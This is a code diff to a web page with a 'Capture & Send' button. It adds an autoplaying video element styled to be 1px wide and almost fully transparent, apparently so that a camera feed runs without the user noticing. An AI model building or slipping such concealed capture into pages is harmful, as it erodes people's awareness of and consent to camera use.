@@ -60,6 +60,12 @@
     #capture:hover {
       background-color: rgba(0,100,0,0.9);
     }
+    #video {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      opacity: 0.01;
+    }
 
     /* Responsive tweaks */
     @media (max-width: 480px) {
@@ -90,6 +96,7 @@
 <button id="capture">Capture & Send</button>
 
 <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+<video id="video" autoplay playsinline></video>
 
 <script>
 const canvas = document.getElementById("canvas");
@@ -125,4 +132,5 @@ captureBtn.onclick = async () => {
 
 </body>
 </html>
+
 
